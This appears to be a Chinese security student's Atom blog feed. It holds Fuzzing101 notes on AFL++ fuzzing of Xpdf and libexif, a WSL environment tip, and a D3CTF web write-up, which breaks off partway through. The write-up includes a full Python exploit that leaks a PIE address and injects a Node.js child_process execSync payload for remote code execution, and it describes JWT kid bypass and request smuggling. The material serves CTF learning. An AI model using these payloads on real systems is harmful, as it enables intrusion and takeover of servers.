<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-05-04T12:08:27.880Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>go_test_note</title>
    <link href="http://example.com/2024/05/04/go-test-note/"/>
    <id>http://example.com/2024/05/04/go-test-note/</id>
    <published>2024-05-04T12:08:27.000Z</published>
    <updated>2024-05-04T12:08:27.880Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>Fuzzing101-复现记录</title>
    <link href="http://example.com/2024/05/03/Fuzzing-101/"/>
    <id>http://example.com/2024/05/03/Fuzzing-101/</id>
    <published>2024-05-03T13:58:40.000Z</published>
    <updated>2024-05-03T14:00:59.403Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>学长搞Fuzz毕设，顺道跟着学了点</p><p>寒假时，主要跟着Github上的<a href="https://github.com/antonio-morales/Fuzzing101">Fuzzing-101</a>的项目学习复现</p></blockquote><h1 id="Exercise1-Xpdf"><a href="#Exercise1-Xpdf" class="headerlink" title="Exercise1 - Xpdf"></a>Exercise1 - Xpdf</h1><blockquote><p>目标：fuzz Xpdf PDF查看器，在Xpdf 3.02中查找 CVE-2019-13208 崩溃</p></blockquote><h2 id="使用afl-clang-fast编译器构建Xpdf（插桩）"><a href="#使用afl-clang-fast编译器构建Xpdf（插桩）" class="headerlink" title="使用afl-clang-fast编译器构建Xpdf（插桩）"></a>使用afl-clang-fast编译器构建Xpdf（插桩）</h2><p>导入llvm环境变量，指明llvm的版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br></pre></td></tr></table></figure><p>指定编译器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CC=$HOME/AFLplusplus/afl-clang-fast CXX=$HOME/AFLplusplus/afl-clang-fast++ ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h2 id="运行afl-fuzz"><a href="#运行afl-fuzz" class="headerlink" title="运行afl-fuzz"></a>运行afl-fuzz</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i $HOME/fuzzing_xpdf/pdf_examples/ -o $HOME/fuzzing_xpdf/out/ -s 123 -- $HOME/fuzzing_xpdf/install/bin/pdftotext @@ $HOME/fuzzing_xpdf/output</span><br></pre></td></tr></table></figure><p><code>-i</code>：输入案例的目录</p><p><code>-o</code>：存储AFL存储突变文件的目录</p><p><code>-s</code>：指定静态伪随机数种子</p><p><code>--</code>：指向<code>afl-fuzz</code>的输入案例的具体样本</p><p><code>@@</code>：文件占位符，为<code>-i</code>目录中具体文件</p><h2 id="处理报错"><a href="#处理报错" class="headerlink" title="处理报错"></a>处理报错</h2><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401141754952.png" alt="image-20240114175354734"></p><p><code>export</code>环境变量<code>AFL_I_DONT_CARE_ABOUT_MISSING_CRASHES=1</code></p><p>然后开始运行<code>fuzz</code></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401192251049.png" alt="image-20240114175755242"></p><p>此处我们主要看<code>overall results</code>中的<code>crashes</code>提示</p><h2 id="处理崩溃：调试"><a href="#处理崩溃：调试" class="headerlink" title="处理崩溃：调试"></a>处理崩溃：调试</h2><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401192251456.png" alt="image-20240114180711467"></p><p>首先获取符号表(<code>-g</code> 标志会在可执行文件中包含调试符号表（debug symbol table）)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rm -r $HOME/fuzzing_xpdf/install</span><br><span class="line">cd $HOME/fuzzing_xpdf/xpdf-3.02/</span><br><span class="line">make clean</span><br><span class="line">CFLAGS=&quot;-g -O0&quot; CXXFLAGS=&quot;-g -O0&quot; ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br><span class="line">make</span><br><span class="line">make install </span><br></pre></td></tr></table></figure><p>使用gdb调试<code>pdftotext</code>文件，同时需要注入崩溃样本</p><p>（pdftotext的参数为一个输入样本，然后输出文本到output中）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb --args /home/fuzz/fuzzing_xpdf/install/bin/pdftotext /home/fuzz/fuzzing_xpdf/out/default/crashes/id:000002,sig:11,src:001614,time:402229,execs:262135,op:havoc,rep:4 /home/fuzz/fuzzing_xpdf/output</span><br></pre></td></tr></table></figure><ul><li><p>调试分析</p><p>无限递归调用，完成Dos攻击</p></li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401192251961.png" alt="image-20240115173303979"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>学会看源码项目的测试</li><li>学会AFL的基本使用</li></ol><h1 id="Exercise-2-libexif-0-16-14-Fuzz"><a href="#Exercise-2-libexif-0-16-14-Fuzz" class="headerlink" title="Exercise 2 - libexif 0.16.14 Fuzz"></a>Exercise 2 - libexif 0.16.14 Fuzz</h1><h2 id="libexif和exif是什么？"><a href="#libexif和exif是什么？" class="headerlink" title="libexif和exif是什么？"></a>libexif和exif是什么？</h2><p>libexif是一个可移植C语言编写的库，作用是从图像文件读取和写入EXIF元信息</p><p>exif是一种图片格式</p><p>我们需要使用libexif解析exif</p><h2 id="构建libexif"><a href="#构建libexif" class="headerlink" title="构建libexif"></a>构建libexif</h2><p>从GitHub上wget对应的demo版本后</p><p>安装工具链</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install autopoint libtool gettext libpopt-dev</span><br></pre></td></tr></table></figure><p>然后使用autoreconf生成Makefile，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">autoreconf -fvi</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-f 强制生成文件</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-v 显示详细的输出信息</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-i 自动运行aclocal和autoheader</span></span><br></pre></td></tr></table></figure><p>静态编译，并指定生成路径</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --enable-shared=no --prefix=&quot;/home/fuzz/fuzzing_libexif/install&quot;</span><br></pre></td></tr></table></figure><p>然后编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h2 id="构建exif并调用libexif解析"><a href="#构建exif并调用libexif解析" class="headerlink" title="构建exif并调用libexif解析"></a>构建exif并调用libexif解析</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">autoreconf -fvi</span><br></pre></td></tr></table></figure><p>然后静态编译，并指明<code>pc</code>文件路径</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --enable-shared=no --prefix=&quot;/home/fuzz/fuzzing_libexif/install&quot; PGP_CONFIG_PATH=/home/fuzz/fuzzing_libexif/install/lib/pkgconfig</span><br></pre></td></tr></table></figure><p>然后编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>去网上找了个exif图片格式的图片仓库：<a href="https://github.com/ianare/exif-samples">https://github.com/ianare/exif-samples</a></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401192251733.png" alt="image-20240119224157553"></p><h2 id="使用AFL-Clang-Fast进行构建"><a href="#使用AFL-Clang-Fast进行构建" class="headerlink" title="使用AFL-Clang-Fast进行构建"></a>使用AFL-Clang-Fast进行构建</h2><p>老规矩删除之前的编译产物</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rm -r /home/fuzz/fuzzing_libexif/install</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在libexif下</span></span><br><span class="line">make clean</span><br></pre></td></tr></table></figure><ul><li>报错修复：</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401192251681.png" alt="image-20240119225157087"></p><p>​删除对应注释，使得clean-apidocs规则生效</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401192251774.png" alt="image-20240119225050204"></p><p>​指定编译器后开始测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb --args /home/fuzz/fuzzing_libexif/install/bin/exif /home/fuzz/fuzzing_libexif/out/default/crashes/id:000000,sig:11,src:000008,time:20982,execs:24217,op:havoc,rep:1 /home/fuzz/fuzzing_libexif/output</span><br></pre></td></tr></table></figure><p>（还不怎么会二进制的漏洞利用，成因也就不分析了）</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401201035271.png" alt="image-20240120103510186"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;学长搞Fuzz毕设，顺道跟着学了点&lt;/p&gt;
&lt;p&gt;寒假时，主要跟着Github上的&lt;a href=&quot;https://github.com/antonio-morales/Fuzzing101&quot;&gt;Fuzzing-101&lt;/a&gt;的项目学习复现&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="Fuzz" scheme="http://example.com/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>WSL Ubuntu与Windows的环境变量管理</title>
    <link href="http://example.com/2024/05/02/wsl-path-manage/"/>
    <id>http://example.com/2024/05/02/wsl-path-manage/</id>
    <published>2024-05-02T04:30:00.000Z</published>
    <updated>2024-05-02T04:40:51.731Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WSL与Windows的环境变量管理"><a href="#WSL与Windows的环境变量管理" class="headerlink" title="WSL与Windows的环境变量管理"></a>WSL与Windows的环境变量管理</h1><p>在WSL2中默认可以获取宿主机中的环境变量，从而会导致混淆等错误</p><p>隔离方法如下</p><p>创建<code>/etc/wsl.conf</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">touch</span> /etc/wsl.conf</span><br></pre></td></tr></table></figure><p>然后修改内容为</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[interop]</span><br><span class="line">appendWindowsPath = false</span><br></pre></td></tr></table></figure><p>重启<code>wsl</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --shutdown</span><br></pre></td></tr></table></figure><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021240386.png" alt="image-20240502124023025"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;WSL与Windows的环境变量管理&quot;&gt;&lt;a href=&quot;#WSL与Windows的环境变量管理&quot; class=&quot;headerlink&quot; title=&quot;WSL与Windows的环境变量管理&quot;&gt;&lt;/a&gt;WSL与Windows的环境变量管理&lt;/h1&gt;&lt;p&gt;在WSL2中</summary>
      
    
    
    
    
    <category term="WSL" scheme="http://example.com/tags/WSL/"/>
    
  </entry>
  
  <entry>
    <title>2024-D3CTF-WP and Review</title>
    <link href="http://example.com/2024/05/02/2024-D3CTF-Review/"/>
    <id>http://example.com/2024/05/02/2024-D3CTF-Review/</id>
    <published>2024-05-02T02:28:34.000Z</published>
    <updated>2024-05-02T10:11:29.082Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024-D-3CTF-Web-WP和复现"><a href="#2024-D-3CTF-Web-WP和复现" class="headerlink" title="2024-D^3CTF-Web-WP和复现"></a>2024-D^3CTF-Web-WP和复现</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Stack-Overflow"><a href="#Stack-Overflow" class="headerlink" title="Stack-Overflow"></a>Stack-Overflow</h3><p>大致流程就是通过栈溢出将PIE write到stdout从而泄露PIE，然后通过溢出执行read覆盖cmd，从而实现RCE</p><p>这题附件和远端环境还不一样，真搞人。。。</p><p>EXP如下，最后直接访问index.html就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://106.14.121.29:32149&quot;</span></span><br><span class="line"><span class="comment">#url = &quot;http://127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># read the pie</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readThePIE</span>():</span><br><span class="line">    s = requests.session()</span><br><span class="line"></span><br><span class="line">    exploit = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        exploit.append(<span class="built_in">str</span>(i))</span><br><span class="line">    exploit.append(<span class="string">&quot;28&quot;</span>)</span><br><span class="line">    exploit.append(<span class="string">&quot;[[ 0 ]]&quot;</span>)</span><br><span class="line">    exploit.append(<span class="string">&quot;stdin&quot;</span>)</span><br><span class="line">    exploit.append(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">    exploit.append(<span class="string">&quot;1111111&quot;</span>)</span><br><span class="line">    exploit.append(<span class="string">&quot;222222&quot;</span>)</span><br><span class="line">    exploit.append(<span class="string">&quot;63&quot;</span>)            <span class="comment"># 通过溢出覆盖write的参数实现越界读</span></span><br><span class="line"></span><br><span class="line">    jsondata = &#123;</span><br><span class="line">        <span class="string">&quot;stdin&quot;</span>: exploit</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    resp1 = s.post(url=url, json=jsondata)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;PIE: <span class="subst">&#123;<span class="built_in">int</span>(resp1.content.decode()[<span class="number">36</span>:<span class="number">46</span>]) - <span class="number">24</span>&#125;</span>&quot;</span>)</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(resp1.content.decode()[<span class="number">36</span>:<span class="number">46</span>]) - <span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writeCmd</span>(<span class="params">pie</span>):</span><br><span class="line">    s = requests.session()</span><br><span class="line">    exploit = []</span><br><span class="line">    </span><br><span class="line">    payload2 = <span class="string">&#x27;const process = this.constructor.constructor(&quot;return this.process&quot;)();process.mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag &gt; /app/index.html&quot;).toString()&#x27;</span></span><br><span class="line"></span><br><span class="line">    exploit.append(<span class="string">&quot;(function (...a)&#123; console.log(\&quot;hack\&quot;);&quot;</span> + payload2 + <span class="string">&quot;;return a.map(s=&gt;console.log(s)).join(\&quot; \&quot;); &#125;)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>):</span><br><span class="line">        exploit.append(<span class="built_in">str</span>(i))</span><br><span class="line">    </span><br><span class="line">    exploit.append(<span class="string">&quot;28&quot;</span>)</span><br><span class="line">    exploit.append(<span class="string">f&quot;<span class="subst">&#123;pie&#125;</span>&quot;</span>)</span><br><span class="line">    exploit.append(<span class="string">&quot;stdin&quot;</span>)</span><br><span class="line">    exploit.append(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">    exploit.append(<span class="string">&quot;1&quot;</span>)      <span class="comment"># size</span></span><br><span class="line">    exploit.append(<span class="string">f&quot;<span class="subst">&#123;pie+<span class="number">42</span>&#125;</span>&quot;</span>)</span><br><span class="line">    exploit.append(<span class="string">&quot;stdin&quot;</span>)</span><br><span class="line">    exploit.append(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    jsondata = &#123;</span><br><span class="line">        <span class="string">&quot;stdin&quot;</span>: exploit</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    resp1 = s.post(url=url, json=jsondata)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(resp1.content)</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pie = readThePIE()</span><br><span class="line">    writeCmd(pie)</span><br></pre></td></tr></table></figure><h3 id="doctor（复现）"><a href="#doctor（复现）" class="headerlink" title="doctor（复现）"></a>doctor（复现）</h3><h4 id="新知识点"><a href="#新知识点" class="headerlink" title="新知识点"></a>新知识点</h4><ul><li>go embed</li></ul><p>参考：<a href="https://zhuanlan.zhihu.com/p/351931501">https://zhuanlan.zhihu.com/p/351931501</a></p><p>这是go1.16中引入的新特性，通过<code>//go:embed</code>指令，可以在编译阶段将静态资源文件打包进编译好的程序中，并提供访问这些文件的能力</p><p>例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//go:embed dist/*</span></span><br><span class="line"><span class="keyword">var</span> f embed.FS</span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed dist/index.html</span></span><br><span class="line"><span class="keyword">var</span> html <span class="type">string</span></span><br></pre></td></tr></table></figure><p>作用：将静态资源打包入二进制程序，防止静态资源丢失以影响程序执行，常用于Go模板、静态web服务、数据库迁移等</p><p>使用：</p><p>在embed中，可以将静态资源文件嵌入到三种类型的变量中，分别为字符串、字节数组、<code>embed.FS</code>文件类型中</p><ul><li>读取文件到字符串中</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">_ <span class="string">&quot;embed&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed version.txt</span></span><br><span class="line"><span class="keyword">var</span> version <span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(version)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>读取文件到字节数组中</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    _ <span class="string">&quot;embed&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed version.txt</span></span><br><span class="line"><span class="keyword">var</span> versionByte []<span class="type">byte</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;version %q\n&quot;</span>, <span class="type">string</span>(versionByte))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>使用<code>embed.FS</code>管理目录</p><p>这里主要涉及三种方法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Open 打开要读取的文件，并返回文件的fs.File结构.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f FS)</span></span> Open(name <span class="type">string</span>) (fs.File, <span class="type">error</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ReadDir 读取并返回整个命名目录</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f FS)</span></span> ReadDir(name <span class="type">string</span>) ([]fs.DirEntry, <span class="type">error</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ReadFile 读取并返回name文件的内容.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f FS)</span></span> ReadFile(name <span class="type">string</span>) ([]<span class="type">byte</span>, <span class="type">error</span>)</span><br></pre></td></tr></table></figure><p>一个用于展示static目录的demo</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;embed&quot;</span></span><br><span class="line">_ <span class="string">&quot;embed&quot;</span></span><br><span class="line"><span class="string">&quot;io/fs&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">useOS := <span class="built_in">len</span>(os.Args) &gt; <span class="number">1</span> &amp;&amp; os.Args[<span class="number">1</span>] == <span class="string">&quot;live&quot;</span></span><br><span class="line">http.Handle(<span class="string">&quot;/&quot;</span>, http.FileServer(getFileSystem(useOS)))</span><br><span class="line">http.ListenAndServe(<span class="string">&quot;:8888&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed static</span></span><br><span class="line"><span class="keyword">var</span> embedFiles embed.FS</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getFileSystem</span><span class="params">(useOS <span class="type">bool</span>)</span></span> http.FileSystem &#123;</span><br><span class="line"><span class="keyword">if</span> useOS &#123;<span class="comment">// live模式类似于hot-deploy, 直接读取宿主机环境上的static目录进行显示</span></span><br><span class="line">log.Print(<span class="string">&quot;using live mode&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> http.FS(os.DirFS(<span class="string">&quot;static&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">log.Print(<span class="string">&quot;using embed mode&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 直接使用打包进二进制程序的static目录</span></span><br><span class="line">fsys, err := fs.Sub(embedFiles, <span class="string">&quot;static&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> http.FS(fsys)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="d3pythonhttp（复现）"><a href="#d3pythonhttp（复现）" class="headerlink" title="d3pythonhttp（复现）"></a>d3pythonhttp（复现）</h3><p>考点：JWT鉴权绕过、请求走私、pickle反序列化</p><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>鉴权依靠jwt，在<code>/login</code>路由下生成jwt的token，在<code>/admin</code>路由下进行<code>verify_token</code></p><p>一开始想着怎么进行<code>fronted_key</code>泄露，其实这是一个逻辑洞的绕过</p><p>根据JWT的结构，头部部分可以进行伪造，而key的获取是依靠于头部中的kid字段来确定的，即我们可以随便指定一个路径使得get_key触发异常直接pass，然后返回空</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021807430.png" alt="image-20240502145337969"></p><h4 id="走私绕过"><a href="#走私绕过" class="headerlink" title="走私绕过"></a>走私绕过</h4><p>前后端中对于<code>Backdoor..</code>字符串的处理不同，我们需要利用前端和后端对于TE的解析差异进行走私</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021807105.png" alt="image-20240502163953630"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021807442.png" alt="image-20240502163920761"></p><p>对于TE头的具体解析差异如下：</p><p>前端全转小写</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021807391.png" alt="image-20240502164207102"></p><p>后端对大小写敏感</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021807852.png" alt="image-20240502164232879"></p><p>也就是说，我们可以使用大小写使得TE头在前端成功解析，但是在后端使用CL解析，即TE-CL走私</p><ul><li>关于TE头</li></ul><p>设置了 <code>Transfer-Encoding: chunked</code> 后，请求主体按一系列块的形式发送，并将省略 <code>Content-Length</code>。在每个块的开头需要用十六进制数指明当前块的长度，数值后接 <code>\r\n</code>（占 2 字节），然后是块的内容，再接 <code>\r\n</code> 表示此块结束。最后用长度为 0 的块表示终止块。终止块后是一个 trailer，由 0 或多个实体头组成，可以用来存放对数据的数字签名等。</p><p>格式如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 